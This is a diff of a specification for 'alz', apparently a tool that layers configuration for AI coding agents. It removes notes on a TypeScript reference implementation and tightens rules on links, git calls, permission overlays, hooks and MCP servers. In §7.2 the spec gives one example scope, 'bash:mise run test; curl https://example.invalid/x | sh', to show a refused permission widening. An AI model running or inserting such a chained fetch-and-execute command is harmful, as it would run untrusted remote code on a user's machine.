@@ -140,17 +140,14 @@ Every directory is optional. A layer may contain only `instructions/`.
 Any other path, such as a README or a folder of notes, is part of the content hash (§5.3) but is
 no item. One exception: each file below a folder in `targets/` whose name is not a known target
 is an error (code `passthrough`) that names the file (§7.11). A file directly in `targets/` is no
-item. The TypeScript `alz` merges files under any folder name there, warns for each file and
-writes none of them (reference drift, TASK-55.5).
+item.
 
 **Markdown frontmatter.** Instruction, agent, overlay, `SKILL.md`, command, rule and
 `CLAUDE.extra.md` files are Markdown with optional YAML frontmatter. CRLF line ends are read as
 LF.
 - A file that starts with `---` and a line feed has a block. The block closes at the next line
   that is exactly `---`. The body is the text after that line's line feed, and is empty when the
-  file ends there. A line such as `----` or `--- x` neither opens nor closes a block. The
-  TypeScript `alz` closes the block at any line that starts with `---` (reference drift,
-  TASK-55.5).
+  file ends there. A line such as `----` or `--- x` neither opens nor closes a block.
 - The block is YAML, read with the rules of §7.13 "YAML limits". The whole file counts towards
   the 1 MiB cap and must be strict UTF-8. A YAML error is located at the file's line and column
   (codes `yaml`, `yaml-tag`).
@@ -161,8 +158,7 @@ LF.
     `frontmatter`).
 - A file that does not start that way has no block: an empty mapping, and the whole text as the
   body. Neither the 1 MiB cap nor the control-character rule applies to it, only the 16 MiB cap
-  of every file (§5.3). It must still be valid UTF-8, or it is an error (code `frontmatter`). The
-  TypeScript `alz` reads it with the invalid bytes replaced (reference drift, TASK-55.5).
+  of every file (§5.3). It must still be valid UTF-8, or it is an error (code `frontmatter`).
 
 ### 4.2 Where layers live
 
@@ -215,9 +211,6 @@ Adoption is planned in full before anything is written. If any part cannot be ad
 (an unknown permission tool, a literal env value in `.mcp.json`, a hook type other than
 `command`), nothing changes and every problem is listed.
 
-The rules below are the Rust `alz`'s (TASK-55.6). Where the TypeScript `alz` differs, the
-paragraph says so; each difference is reference drift (decision-30).
-
 **The header and its sources.** A source is written `<layer>@<rev>:<path>`, where `<rev>` is the
 stack entry's `ref` or else the layer's `version`, or `<layer>:<path>` when there is neither.
 Sources are joined with ` + `, and a file with no source names `no instructions`. Markdown files
@@ -232,8 +225,7 @@ of §10.1) and no `-->`. A layer file name with such a character already makes t
 (§5.3 "File names"). A source that still holds one, through the layer's `version`, the entry's
 `ref` or the path, is the error `layer` at `<layer>:<path>`, and the build writes nothing. The
 message is `a source of the generated header holds a control or format character or '-->', which
-would end its comment; rename the file or change the version or ref`. The TypeScript `alz`
-writes every source as it is.
+would end its comment; rename the file or change the version or ref`.
 
 **Which files are alz's own.** A file in the repository is alz's own only when one of these holds:
 - it carries the generated mark;
@@ -256,16 +248,14 @@ repository, path by path:
 - a path the previous lock lists that is not alz's own any more is left alone.
 
 So a hand-edited file without a header, such as `.claude/settings.json`, is a collision at the
-next build, and `alz build --adopt` takes it into the repo layer. The TypeScript `alz` treats
-every path the previous lock lists as its own, whatever the file holds.
+next build, and `alz build --adopt` takes it into the repo layer.
 
 **Links.** alz never writes, creates, renames or deletes through a link. Each path is opened one
 component at a time from the repository root without following links (decision-27). A path the
 build writes whose entry, or any folder above it inside the repository, is a symbolic link is a
 collision, with the message `is a link or lies under one; alz never writes through a link`. An
 entry where the build writes a file that is not a regular file (a folder, a FIFO, a device) is a
-collision too, with the message `is not a regular file`. A link is never alz's own. The
-TypeScript `alz` follows links.
+collision too, with the message `is not a regular file`. A link is never alz's own.
 
 **Paths that differ only in case.** Generated paths, the paths on disk they are compared with,
 and protected paths (§4.5) are compared after case folding: two paths are the same when their NFD
@@ -273,7 +263,6 @@ forms are equal after ASCII lower-casing, as on a file system that ignores case 
 `É` and `é` fold together (NFD splits off the accent), while letters with no ASCII base, such as
 Greek sigma, stay apart. Two outputs of one build whose paths fold to the same path are an
 error: a passthrough file is the error `passthrough` (§7.11), and the generated file is kept.
-The TypeScript `alz` compares paths exactly.
 
 **What the writer compares.** A file is read for the comparison up to 1 MiB (1048576 bytes); an
 entry that is longer is a collision with the message `is larger than 1048576 bytes, which alz does
@@ -326,13 +315,13 @@ written by the rules above, links included.
   as a control, format or line separator character, a name outside its grammar or a key the schema
   refuses, is a problem that names the native file and never prints the text (TASK-73).
 - A concrete model that an agent or `settings.json` names reuses the alias of the merged stack
-  that has the model for Claude. When several do, the first in the order the reference lists
-  them wins: names that are whole numbers (array indexes) first, ascending, then the others in the
+  that has the model for Claude. When several do, the first in this order
+  wins: names that are whole numbers (array indexes) first, ascending, then the others in the
   order a layer first wrote them, the most general layer first and each file in its own order.
   Otherwise the model is added to `models.yaml` as an alias of its own name, or `claude-<name>`
   when a general layer owns that name.
 - A float of `settings.json` or `.mcp.json` is written to the layer as the emitter writes it
-  (§10.2), as the reference does; whether the layer may hold it is the schema's to say (a typed
+  (§10.2); whether the layer may hold it is the schema's to say (a typed
   number key accepts it, a key of another type refuses it in the reader check).
   A `null` is written the same way and no settings key takes one, so the reader check refuses it.
   A native agent field that holds a null or a float stays refused, because the agent writer does
@@ -355,8 +344,7 @@ written by the rules above, links included.
   there, then unlinked from the old one, so a moved script keeps its mode), the removed files are
   deleted, the folders they left empty are removed, and `layer.yaml` is written last. No step
   follows a link.
-- JSON numbers are read exactly: a float is read as the nearest double, as JavaScript's
-  `JSON.parse` reads it (decision-33, amended).
+- JSON numbers are read exactly: a float is read as the nearest double (decision-33, amended).
 - A layer file that adoption adds to is read, merged (maps key by key, lists appended without
   duplicates) and written again with the emitter of §10.2. A value of another shape than the one on
   disk is a problem.
@@ -373,9 +361,6 @@ written by the rules above, links included.
   flow mapping, or several documents. The problem names `layer.yaml` and the values to add by
   hand. The edited text must parse as a manifest (§5.2) that holds the added values and is
   otherwise unchanged, or nothing is adopted.
-- The TypeScript `alz` writes the whole `layer.yaml` again with the `yaml` package, keeping
-  comments, so its bytes can differ elsewhere in the file. It writes adoption problems with the
-  native text as it is, and it does not check the planned layer first.
 
 ### 4.4 The client hub (multi-repo clients)
 
@@ -427,13 +412,11 @@ The list is extendable through `protected_paths:` in the repo manifest.
 
 Each entry is a glob over the path from the repository root. `**` matches any number of
 folders, and `**/` at least none. `*` matches any run of characters within one segment, and `?`
-one Unicode scalar value within one segment (the TypeScript `alz` counts a UTF-16 unit, so its
-`?` does not match a character outside the Basic Multilingual Plane: reference drift,
-TASK-55.6). Every other character stands for itself. A leading `/` is ignored, and a pattern
+one Unicode scalar value within one segment, also one outside the Basic Multilingual Plane.
+Every other character stands for itself. A leading `/` is ignored, and a pattern
 without `/` matches the file name at any depth, as in `.gitignore`. A pattern and a path are
 compared after the case folding of §4.3 ("Paths that differ only in case": the NFD form, then
-ASCII lower case), so `Backlog/x.md` is protected like `backlog/x.md`; the TypeScript `alz`
-matches case exactly (reference drift, TASK-55.6). A file that a layer ships at a protected path is left out of the
+ASCII lower case), so `Backlog/x.md` is protected like `backlog/x.md`. A file that a layer ships at a protected path is left out of the
 build, with the warning `protected` naming the path; it is not in the lock's `files`, and the
 build never writes, updates or deletes it.
 
@@ -466,7 +449,7 @@ Unknown fields are a schema error, so a layer that declares `commit_identity` ne
 agent-layerz 0.2.0 or later, and a layer that declares `account` needs the minor release that
 adds it (its release note names the version).
 
-**Field rules** (TASK-55.3; the reference's behaviour unless a drift is named). Each error here is
+**Field rules** (TASK-55.3). Each error here is
 `layer` at `<layer>:layer.yaml` and follows §10.1: it names the field and never prints its value.
 - `name` is required: lower-case ASCII letters and digits in groups joined by a single `-` or
   `.`, that is `^[a-z0-9]+(?:[-.][a-z0-9]+)*$`.
@@ -480,8 +463,7 @@ adds it (its release note names the version).
   required field that is null is reported as missing. `account` is the exception: `account: null`
   and a null name inside it are refused (§7.13).
 - A field that expects text and holds a number is an error that suggests quoting the value:
-  `version: 1.10` is the number 1.1, so it is written `version: "1.10"`. The TypeScript `alz`
-  turns the number into text instead (`1.1`; reference drift, TASK-55.3).
+  `version: 1.10` is the number 1.1, so it is written `version: "1.10"`.
 - A `layer.yaml` with a `stack` field is a repository's stack manifest (§5.2), and is an error
   where a layer is expected.
 - A layer without `layer.yaml` is the error `layer`, as is one whose `layer.yaml` is a link, a
@@ -516,7 +498,7 @@ options:
 
 Supported `source` schemes: `path:`, `github:owner/repo@ref`, `git:<url>@ref`.
 
-**Field rules** (TASK-55.3; the reference's behaviour unless a drift is named). Each error here is
+**Field rules** (TASK-55.3). Each error here is
 `manifest` at `layer.yaml` and follows §10.1: it names the field and never prints its value. A
 repository without `layer.yaml` is the error `no-manifest`.
 - `stack` is required and is a non-empty list. Each entry is a mapping with `source` (text, one of
@@ -524,20 +506,17 @@ repository without `layer.yaml` is the error `no-manifest`.
 - `ref` is text that does not start with `-`, holds no `..` and holds only ASCII letters, digits,
   `.`, `_`, `/`, `+` and `-`. A `ref` that is a list, a mapping or a number is an error that names
   `stack[<n>].ref` (TASK-61). `ref: 1.10` is the number 1.1, so a ref that looks like a number is
-  quoted: `ref: "1.10"`. The TypeScript `alz` converts the value with `String()`, so `[x]` becomes
-  `x` and `1.10` becomes `1.1` (reference drift, TASK-61). `ref` pins a `path:` source (§6). A
+  quoted: `ref: "1.10"`. `ref` pins a `path:` source (§6). A
   `github:` or `git:` source carries its ref after `@`; a `ref` field on such an entry is checked
-  but has no effect, as in the reference.
+  but has no effect.
 - `targets` is a list of target names (§8), `claude` when absent. Any other name is an error that
-  names `targets[<n>]`; the TypeScript `alz` reports it only when it looks up the adapter, and
-  quotes the name.
+  names `targets[<n>]`.
 - `workspace.hub` and each entry of `workspace.add_dirs` are non-empty paths relative to the
   repository: not absolute and not starting with `~`. A `\` is read as `/`, the path is
   normalised and a trailing `/` removed. Among the additional directories the hub comes first, and
   duplicates are dropped.
 - `protected_paths` is a list of text. `mcp.enable` is a list of server ids (§7.7). An entry that
-  is not a server id is a schema error, and the TypeScript `alz` takes any text there (reference
-  drift, TASK-55.5).
+  is not a server id is a schema error.
 - `budgets.instructions_max_lines`, `budgets.instructions_max_bytes` (32768 when absent, Codex's
   `project_doc_max_bytes`) and `budgets.always_loaded_skills_max` are whole numbers, 0 or more. A
   float without a fractional part, such as `2.0` or `1e3`, counts as a whole number (decision-28).
@@ -591,7 +570,7 @@ A user name alone stays allowed for `ssh://` and the scp-like form, as in
 `git@github.com:owner/repo.git`. The error is `source`, with no location and the message
 `a git: source in layer.yaml holds credentials in its URL; remove them and use a git credential
 helper`. The source is never printed, so the token does not reach the terminal, `layer.lock` or
-`allowed.yaml`. The TypeScript `alz` accepts such URLs (reference drift, TASK-71).
+`allowed.yaml` (TASK-71).
 
 ### 5.3 `layer.lock`
 
@@ -606,18 +585,13 @@ path is built from it.
 UTF-8 and parsed as one JSON document nested at most 128 levels deep, counting the top-level
 value as level 1, so at most 127 arrays or objects lie inside one another. A duplicate key in any object
 makes the lock invalid, as does a `lockVersion` other than 1. An invalid lock is the error `lock` at
-`layer.lock` (§10.1), and stops the command before any of its values is used. The TypeScript `alz`
-keeps the last of two duplicate keys, as `JSON.parse` does (reference drift, TASK-55.3).
+`layer.lock` (§10.1), and stops the command before any of its values is used.
 
 **What the content hash covers.** The path and content of every regular file of the layer, in
 code point order (name order, §6), except `.env` files (never read), `.DS_Store`, and anything
 under `.git` or `node_modules`. Symbolic links and other non-regular entries are not hashed.
 The file mode is not part of the hash, so the hash alone does not notice a changed executable
-bit. Its format does not change, so existing locks stay valid. One exception: the TypeScript
-`alz` orders the files by UTF-16 unit (decision-30 leaves it unchanged), so for a layer with two
-paths whose first difference is a character above U+FFFF in one and a character in
-U+E000–U+FFFF in the other, the Rust `alz` computes a different hash from the one the
-TypeScript `alz` wrote into its lock.
+bit.
 
 **Byte layout** (TASK-65). The content hash is the lowercase hexadecimal sha256 of one text
 made of a record per file, in name order: the file's path relative to the layer directory,
@@ -655,8 +629,7 @@ YAML frontmatter. This check follows the one for a name that is not valid Unicod
 the same names, the paths of a pinned layer's git tree included. The build stops with the error
 `layer` and the message `a file or folder name in layer '<source>' holds a control or format
 character; rename it`, with no location, and the name itself is never printed. Account resolution
-counts such a layer as a cache miss (`layer-invalid`). The TypeScript `alz` accepts such names
-(reference drift, TASK-55.6).
+counts such a layer as a cache miss (`layer-invalid`, TASK-55.6).
 
 A name that is valid Unicode but not a safe relative path (`SafeRelPath`, §6: a backslash, a
 `.` or `..` segment, or a `.git` segment in any case, with or without a trailing dot or space)
@@ -678,13 +651,6 @@ the build the name check comes first, before the content hash is computed or com
 `layer.yaml` is read or any `.env` file is reported. A file of more than 16 MiB is unreadable in the
 build too, at the place of a file that cannot be read in that order (the 16 MiB in all are not
 limited there).
-
-The TypeScript `alz` reads names from the file system as UTF-8 with U+FFFD in place of each
-invalid sequence and then cannot open the file or folder by that name. So account resolution
-reports `unreadable`, and the build fails with another error. For a pinned layer it decodes the
-tree listing the same way but reads each blob by its id, so it probably writes and hashes the
-name with U+FFFD instead of failing (reference drift, TASK-69; read from `src/core/files.ts`,
-`src/resolve/reader-load.ts` and `src/resolve/tree-cache.ts`, not run).
 
 **Cache integrity.** When a layer is read from the layer cache (§6), the lock has an entry for
 the same `source`, and that entry's `sha` equals the commit just resolved, the layer's content
@@ -781,13 +747,6 @@ entry (§6) or an entry whose content is not what the lock recorded.
    own name (`git-<hex>@<sha>`, `tree2@<id>` or `pathref@<hex>-<sha>`). The entries inside the
    cache are never followed through a link (above).
 
-   The TypeScript `alz` differs (reference drift, TASK-52, TASK-53):
-   - it uses `XDG_CACHE_HOME` whenever the variable is set, so an empty value puts the cache in
-     the working directory;
-   - it refuses neither a cache inside the repository nor one in an account folder;
-   - it creates missing folders with mode `0777` minus the umask;
-   - it does not check the owner or the mode of the cache root or of an entry.
-
    **Layers in or around an account folder** (TASK-52). Every command that resolves the stack
    finds the directory of a `path:` layer, pinned or not, and of a local `git:` source, from the
    path as written:
@@ -824,9 +783,6 @@ entry (§6) or an entry whose content is not what the lock recorded.
    home folder is the error `source` above in every case. Stack resolution uses the first two
    messages of this paragraph.
 
-   The TypeScript `alz` resolves the path with `realpath` and makes no such check in these
-   commands, so it opens the files of such a layer (reference drift, TASK-52).
-
    **A failed fetch** (TASK-65). Three git steps can fail for a `github:` or `git:` source: the
    clone, `git rev-parse` of the ref as a commit (of the lock's `sha` when the lock has an entry
    for the source), and the checkout of that commit. Any of them stops the command with the
@@ -846,23 +802,13 @@ entry (§6) or an entry whose content is not what the lock recorded.
    prompt: alz runs them so that they cannot reach the terminal ("Git subprocesses" below),
    because alz could neither see nor sanitise what they write there. A key with a passphrase
    therefore has to be in an agent, and a host whose key is not yet known fails the fetch with
-   the message above (TASK-70; the TypeScript `alz` leaves `ssh` able to prompt, reference
-   drift).
+   the message above (TASK-70).
 
    Once git has succeeded, a failure to read the clone or an existing entry for the hash
    comparison above, or to move the clone into the cache, is not a fetch failure:
    - a name that is not valid UTF-8 is the §5.3 "File names" error;
    - anything else is the error `cache`, with no location and the message
      `cannot store '<source>' in the layer cache at <cache directory>`.
-
-   The TypeScript `alz` differs (reference drift, TASK-68):
-   - it trims git's whole standard error with JavaScript's `trim` (which also removes U+FEFF)
-     and then takes the first line, so a carriage return or trailing white space stays on that
-     line when more lines follow, and a line of control characters counts as a line;
-   - it strips neither the source nor git's line;
-   - it ends the message with `: ` when there is no line;
-   - it reports the read and move failures above as `cannot fetch` with nothing after the
-     colon.
 
    **Git subprocesses** (TASK-63, TASK-70; decision-24). Every git call that resolves a source
    (`clone`, `rev-parse`, `checkout`, `ls-tree`, `cat-file`) runs the `git` found on `PATH`, with
@@ -952,12 +898,6 @@ entry (§6) or an entry whose content is not what the lock recorded.
        within <n> seconds`.
    - Only the machine-readable output that each call asks for is read from git's standard
      output. Its standard error is read only as "A failed fetch" says.
-
-   The TypeScript `alz` differs (reference drift, TASK-63, TASK-70):
-   - it passes its whole environment to these calls, except `GIT_ALLOW_PROTOCOL` on a guarded
-     clone, and allows the transports that the user's configuration allows;
-   - it leaves `ssh` able to prompt on the terminal;
-   - it sets no deadline and checks no version.
 
    **Other messages of resolution** (TASK-55.4.11). Each is stripped as every diagnostic is
    (decision-26, class 1) and has no location unless it says so:
@@ -1097,9 +1037,8 @@ first. A path is one `/`-separated string, not a list of components, so `a-b` so
 `a/b` (`-` is U+002D, `/` is U+002F). There is no locale, case folding or Unicode
 normalization, and a key made of digits is a string like any other: `10` sorts before `9`,
 and `-x` before `5`. This is the order of the strings' UTF-8 bytes, which is Rust's `str`
-order. It is not UTF-16 code unit order, which JavaScript's default `sort()` and `<` use: that
-order puts a character above U+FFFF before one in U+E000–U+FFFF, and the TypeScript `alz`
-sorts that way (reference drift, decision-30). A name or key that holds a lone surrogate, for
+order. It is not UTF-16 code unit order, which puts a character above U+FFFF before one in
+U+E000–U+FFFF. A name or key that holds a lone surrogate, for
 example from a YAML `"\uD800"` escape, has no UTF-8 form and is an error.
 
 ---
@@ -1129,12 +1068,11 @@ security can only get stricter.**
   that file name in a more general layer is `unresolved`, which a lint of one layer leaves out
   (§10.1).
 - Each block's text, and the text of `CLAUDE.extra.md`, is trimmed of Unicode `White_Space` at
-  both ends, and a block that is empty after trimming is dropped. The TypeScript `alz` trims with
-  JavaScript's `trim`, which also removes U+FEFF (reference drift, TASK-55.5.4).
+  both ends, and a block that is empty after trimming is dropped. U+FEFF is not `White_Space`, so it
+  is kept (TASK-55.5.4).
 - `<Layer kind>` is the layer's `kind` as written, with its first character in upper case
-  (`repo` gives `Repo`). Like the layer's name, it is text from the layer, so the Rust `alz` writes
-  it without control and format characters (the class 1 set of §10.1); the TypeScript `alz`
-  writes it as it is (reference drift, TASK-55.6.3).
+  (`repo` gives `Repo`). Like the layer's name, it is text from the layer, so alz writes
+  it without control and format characters (the class 1 set of §10.1, TASK-55.6.3).
 
 ### 7.2 Agents
 An agent source is Markdown with YAML frontmatter, written in a **neutral schema**:
@@ -1198,11 +1136,9 @@ Rules:
     `mise run $(x)`.
 
   Any other wildcard covers only an equal scope, and the scope of any other tool is covered only
-  by an equal one. The TypeScript `alz` reads every scope that ends in `*` as covering any scope
-  that starts with its text before the stars. So `write:docs*` covers `write:docs-private/**`,
-  and `bash:mise run *` covers `bash:mise run test; curl https://example.invalid/x | sh`: an
-  overlay can widen an inherited tool while the build takes it for narrowing. The Rust `alz`
-  refuses both (reference drift, TASK-55.5.6).
+  by an equal one. So `write:docs*` does not cover `write:docs-private/**`, and
+  `bash:mise run *` does not cover `bash:mise run test; curl https://example.invalid/x | sh`:
+  an overlay that narrows to either is refused (TASK-55.5.6).
 
   More precisely:
   - A path base whose segments other than the last end in `**` as well (`docs/**/**`) covers
@@ -1211,7 +1147,7 @@ Rules:
     Braces are literal text.
   - A candidate path scope that starts with `~` or `/`, holds a `\`, or starts with a drive
     letter and `:` (`C:`) is covered only by an equal scope, because it is not a path relative
-    to the repository. The TypeScript `alz` compared it by prefix (reference drift, TASK-55.5).
+    to the repository (TASK-55.5).
   - "The base" is the agent that the overlay refines, including the overlays already applied
     to it, so a later overlay cannot widen again what an earlier one narrowed.
   - An overlay that widens is not applied.
@@ -1238,8 +1174,7 @@ Rules:
   `claude.mcpServers`, `codex.mcp_servers` and the `hooks` of either target are refused in an
   agent's or an overlay's native fields (code `agent`). Servers and hooks come only through
   `mcp.yaml` and `hooks.yaml`, so every agent gets the same ones, and the allowlist and the hook
-  locks apply to all of them. The TypeScript `alz` passes them through (reference drift,
-  TASK-55.5.16).
+  locks apply to all of them (TASK-55.5.16).
 
   Under `claude:` an agent's native fields are typed (TASK-79). The map takes only the
   frontmatter fields that `docs/target-facts.md` §14.4 records with a type: `disallowedTools`
@@ -1248,8 +1183,7 @@ Rules:
   and `experimental` (a mapping with `cacheTtl`, `5m` or `1h`). Any other key is an `agent` error,
   and so is a value of another type; the error names the file and the key path, such as
   `claude.maxTurns`, and never prints the value. A key with a neutral field, and `mcpServers` and
-  `hooks`, are refused as above and not reported twice. `codex:` is not typed. The TypeScript
-  `alz` takes any key and value (reference drift, TASK-79).
+  `hooks`, are refused as above and not reported twice. `codex:` is not typed.
 - **Key order of native fields** (TASK-66). Native fields keep the order of the source:
   - A key keeps the place of its first appearance, in stack order.
   - A key that a later layer adds comes after the existing ones.
@@ -1258,8 +1192,7 @@ Rules:
     untyped map can hold one: `codex:`, since the typed `claude:` fields have fixed names.
 
   A generated agent file writes the neutral fields first, then the native fields in this
-  order. The TypeScript `alz` writes whole-number keys first, in numeric order, because it reads
-  YAML into JavaScript objects (reference drift, TASK-66). Settings do not keep source order:
+  order. Settings do not keep source order:
   their output is sorted by key (§7.9, §10.2).
 - **Other fields.**
   - `name` must equal the file's stem (§4.1).
@@ -1267,8 +1200,7 @@ Rules:
   - `permission_mode` is `bypass_permissions`, `auto`, `accept_edits`, `default`, `dont_ask`
     or `plan`.
   - In an overlay, an error in `extends` or `mode` is an `agent-overlay` error, and a missing
-    `extends` is `extends is required`. An error in any other field is an `agent` error. The
-    TypeScript `alz` uses `agent-overlay` for all of them (reference drift, TASK-55.5.5).
+    `extends` is `extends is required`. An error in any other field is an `agent` error (TASK-55.5.5).
   - An overlay that removes a tool from an agent without a tool list is an `agent-overlay`
     error.
 - **An overlay only makes an agent stricter** (TASK-55.5):
@@ -1281,8 +1213,7 @@ Rules:
 
   Otherwise the overlay is an `agent-overlay` error and is not applied. An example message is
   `overlay on agent <name> sets permission_mode '<mode>', which is looser than '<mode>' of the
-  agent it refines; an overlay may only make an agent stricter`. The TypeScript `alz` takes any
-  mode and any list (reference drift, TASK-55.5).
+  agent it refines; an overlay may only make an agent stricter`.
 
 ### 7.3 Skills
 - Identity is the skill directory name (it must match `name:` in the SKILL.md).
@@ -1322,8 +1253,8 @@ Rules:
 ```
 
 - A hook has exactly one of `run:` (a script of the layer below `hooks/scripts/`, named relative
-  to `hooks/` as in `scripts/block-secrets.sh`, copied into the repo; the TypeScript `alz` takes
-  any file below `hooks/`, reference drift, TASK-55.5) or
+  to `hooks/` as in `scripts/block-secrets.sh`, copied into the repo,
+  TASK-55.5) or
   `command:` (a command line used as written). In a command, `${PROJECT_DIR}` is the repo root;
   each adapter replaces it with its own variable. `timeout` is in seconds.
 - The path of a `run:` script may hold only ASCII letters, digits, `.`, `_`, `-` and `/`, because
@@ -1343,8 +1274,7 @@ Rules:
 - A hook event a target doesn't support becomes a build **warning** for that target. The
   report lists which guardrails fall back to pre-commit/CI.
 - `id` is any text with a visible character. A diagnostic prints it as a quoted key (§10.1).
-- `timeout` is a positive whole number of seconds. The TypeScript `alz` also took fractions
-  (reference drift, TASK-55.5.8).
+- `timeout` is a positive whole number of seconds (TASK-55.5.8).
 - `on_fail` defaults to `warn`.
 - In a native event `<target>:<Event>`, `<target>` is `claude` or `codex`, and `<Event>` matches
   `^[A-Z][A-Za-z]+$`. A native hook may list only its own target in `targets`. `targets: []` is
@@ -1391,14 +1321,13 @@ default_mode: default
   Once a layer sets one to `true`, it stays true. A more specific layer that sets it to `false`
   is a `permission-floor` error that names the field and both layers:
   `<field> is true as set by layer <layer> and cannot be set to false by layer <layer>`. A field
-  that no layer sets, or that is `false` from the first layer that writes it, is not set. R5's
+  that no layer sets, or that is `false` from the first layer that writes it, is not set. The
   Claude adapter writes them as `permissions.disableBypassPermissionsMode`,
   `permissions.blockReadsOutsideWorkingDirectories` and
   `permissions.blockWritesOutsideWorkingDirectories`, once `docs/target-facts.md` records those
   keys (TASK-76). It writes `permissions.disableBypassPermissionsMode` as the string `"disable"`,
   never `true`, because Claude Code takes that key as a string, and the two `block...` keys as
-  booleans (`docs/target-facts.md` §13). The TypeScript `alz` has no such fields and refuses them as unknown (reference
-  drift, TASK-55.5.16).
+  booleans (`docs/target-facts.md` §13, TASK-55.5.16).
 
 ### 7.7 MCP servers
 `mcp.yaml` defines servers by id:
@@ -1418,8 +1347,7 @@ playwright:
   to 63 ASCII letters, digits, `_` or `-`. Any other key of `mcp.yaml`, whatever it is, is an
   error (code `mcp`) that names the layer and the file and prints the key quoted (§10.1). The
   other servers of the file are still checked. The entries of the manifest's `mcp.enable` follow
-  the same grammar (§5.2). The merged servers are an ordered map keyed by server id. The
-  TypeScript `alz` takes any key (reference drift, TASK-55.5).
+  the same grammar (§5.2). The merged servers are an ordered map keyed by server id (TASK-55.5).
 - Same id → the most specific definition wins, and the whole entry is replaced.
 - Only ids listed in the repo manifest's `mcp.enable` are emitted (allowlist). The rest are
   defined but inactive, which keeps the token budget under control.
@@ -1432,8 +1360,7 @@ playwright:
   error, unless it was refused for a protected variable (§7.9).
 - A layer inside the repository (§7.12) may replace a server that a layer outside the repository
   defined. It then gets the warning `server <id> replaces the definition of layer <layer>, which
-  lies outside the repository` (code `mcp`) at its `mcp.yaml`, and the replacement applies. The
-  TypeScript `alz` gives no warning (reference drift, TASK-55.5).
+  lies outside the repository` (code `mcp`) at its `mcp.yaml`, and the replacement applies (TASK-55.5).
 - A protected or malformed `env_from` entry is a `protected-variable` error. It names the file,
   without a line and column (§7.9).
 
@@ -1457,8 +1384,8 @@ roles:
 - An agent's `model: inherit` resolves through its `role`. An explicit alias overrides the role.
 - Concrete model ids live **only** here, so swapping models is a one-line change in one layer.
 - Alias names, role names and concrete model ids are any text that is not blank.
-- A `models.yaml` with any problem gives no aliases, roles or default from that layer. The
-  TypeScript `alz` kept its valid aliases (reference drift, TASK-55.5.11).
+- A `models.yaml` with any problem gives no aliases, roles or default from that layer, not
+  even its valid aliases (TASK-55.5.11).
 
 ### 7.9 Other settings
 `settings.yaml`, namespaced by target:
@@ -1472,14 +1399,13 @@ The top level of `settings.yaml` takes only the target names `claude` and `codex
 value is a mapping; `null` or any other value is an error. Any other top-level key, whatever it is, is an error (code `settings`). The
 error names the layer and the file and prints the key quoted (§10.1), and none of that file's
 settings are merged. Per target, the merged settings are ordered maps of the keys that passed
-these checks. The TypeScript `alz` takes other top-level keys without an error (reference drift,
-TASK-55.5).
+these checks (TASK-55.5).
 
 The merge is a deep merge, a left fold in stack order:
 - Mappings merge key by key.
 - Two arrays are concatenated and de-duplicated, keeping the first occurrence. Two items count as
-  the same when they are equal as values, so mappings that differ only in key order are one item.
-  The TypeScript `alz` compares their JSON text instead (reference drift, TASK-55.5).
+  the same when they are equal as values, so mappings that differ only in key order are one item
+  (TASK-55.5).
 - In every other case the more specific value wins, a change of kind included (an array replaced
   by a scalar).
 
@@ -1493,8 +1419,7 @@ they are also reserved below the top level, in every `features` mapping: `codex.
 `features` of a profile, or one nested anywhere else under `codex:`.
 
 Each reserved key is a `settings` error. It names the file and a key path chosen by alz, such as
-`codex.**.features.hooks`, with `**` for the keys above it, and it never prints the value.
-The TypeScript `alz` checks the top level only (reference drift, TASK-55.5).
+`codex.**.features.hooks`, with `**` for the keys above it, and it never prints the value (TASK-55.5).
 
 **Security-relevant native keys** (TASK-55.5.16). One table in alz decides, for each target,
 which native keys `settings.yaml` refuses and which may only get stricter down the stack. It is
@@ -1582,9 +1507,7 @@ stricter:
 **When a floor is broken.** A looser value, a forbidden new entry, or a change of kind, `null`
 included, is a `settings` error (`'<path>' is a floor: …`). It names the layer, the file and the
 key path, and none of that file's settings are merged. A key that no more general layer set, or
-that it set to `null`, is free. This departs from the left fold above for these keys only. The
-TypeScript `alz` merges all of them freely and refuses only the first-class keys at the top level
-(reference drift, TASK-55.5.16).
+that it set to `null`, is free. This departs from the left fold above for these keys only.
 
 **Facts.** An adapter relies on what one of these keys does only once `docs/target-facts.md`
 records it (TASK-76). Until then the table only refuses or constrains the key.
@@ -1619,8 +1542,6 @@ others, each key optional, and any other key an error at that depth), or one of 
   in a project file.
 - `codex:` has no typed table in this version.
 
-The TypeScript `alz` accepts any key and any value under `claude:` (reference drift, TASK-79).
-
 No layer may set `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `HOME`, `XDG_CONFIG_HOME`,
 `XDG_STATE_HOME` or `XDG_CACHE_HOME`, which choose the account folder or locate alz's own
 files and the layer cache (§7.13). Each of these is a build error (code `protected-variable`)
@@ -1651,8 +1572,7 @@ diagnostic names the file without a line or column.
   name to definition, or a list of names and one-entry maps), under `codex.mcp_servers`, and
   a `shell_environment_policy` under `codex`.
   An agent that sets `claude.mcpServers` or `codex.mcp_servers` is refused earlier, as the error
-  `agent` of §7.2 and not as `protected-variable`; both refuse, and the TypeScript `alz` reports
-  `protected-variable` (reference drift, TASK-55.5.16).
+  `agent` of §7.2 and not as `protected-variable` (TASK-55.5.16).
 - Passthrough files (§7.11), with the path after `targets/<target>/` compared with ASCII
   case folding. Covered: every path ending in `.claude/settings.json` or
   `.claude/settings.local.json`, every `.mcp.json`, and every `.claude-plugin/*.json`, at any
@@ -1696,8 +1616,7 @@ the agent works on matching files (e.g. `backend.md` → `src/**`).
 - Rules are how area conventions stay out of the always-loaded instructions budget.
 - A rule that is not `mode: extend` must have `paths`. Without them it is the `rule` error
   `'paths' is required; always-loaded text belongs in instructions/`.
-- A glob listed twice in one rule's `paths` is kept once. The TypeScript `alz` kept both on a
-  replace (reference drift, TASK-55.5.4).
+- A glob listed twice in one rule's `paths` is kept once, also on a replace (TASK-55.5.4).
 - An `extend` rule with no rule of that name in a more general layer is `unresolved`.
 
 ### 7.11 Passthrough (`targets/<target>/…`)
@@ -1709,13 +1628,11 @@ so passthroughs get turned into first-class items over time.
 - The warning is `raw passthrough to <path>; consider turning it into a first-class item`
   (code `passthrough`). A file below another folder of `targets/` gets the error `this file is
   below a folder of targets/ that is not a target: claude or codex (§7.11)`.
-- A refused passthrough file gives its errors only, and no warning. The TypeScript `alz` warned
-  as well (reference drift, TASK-55.5.12).
+- A refused passthrough file gives its errors only, and no warning (TASK-55.5.12).
 - A passthrough file whose path is the path of a generated file, compared after case folding
   (§4.3), is the error `passthrough` at `<layer>:<file>`, with the message `passthrough <path>
   collides with a generated file`, and the generated file is kept. So
-  `targets/claude/.claude/Settings.json` collides with `.claude/settings.json`. The TypeScript
